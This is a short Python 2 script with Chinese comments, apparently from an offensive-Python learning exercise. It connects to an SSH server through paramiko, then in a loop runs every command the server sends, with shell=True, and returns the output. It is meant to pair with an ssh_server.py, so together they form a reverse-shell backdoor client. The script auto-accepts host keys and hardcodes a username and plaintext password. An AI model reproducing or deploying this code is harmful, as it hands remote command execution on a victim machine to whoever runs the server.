#!/usr/bin/env python
#coding:utf-8
'''
可以连接到SSH服务器的一个客户端程序，当然我这里只是为了搭配ssh_server.py来返回server传过来的命令，然后返回结果
'''
import paramiko
import subprocess


def connect_server(ip, username, password):
    client = paramiko.SSHClient()

    #设置策略自动添加，保存SSH服务器的SSH密钥
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    #开始连接
    client.connect(ip, username=username, password=password)
    ssh_session = client.get_transport().open_session()

    #如果连接成功
    if ssh_session.active:
        #ssh_session.exec_command(command)
        print ssh_session.recv(1024)  #读取一个banner

        try:
            while True:
                command = ssh_session.recv(1024)   #获取server端传过来的命令
                try:
                    result = subprocess.check_output(command, shell=True)
                    ssh_session.send(result)
                except BaseException, e:
                    ssh_session.send(str(e))

        #关闭连接
        except:
            print 'Exit.'
            client.close()

    return

if __name__ == '__main__':
    connect_server('127.0.0.1', 'sking', 'yangjinxin')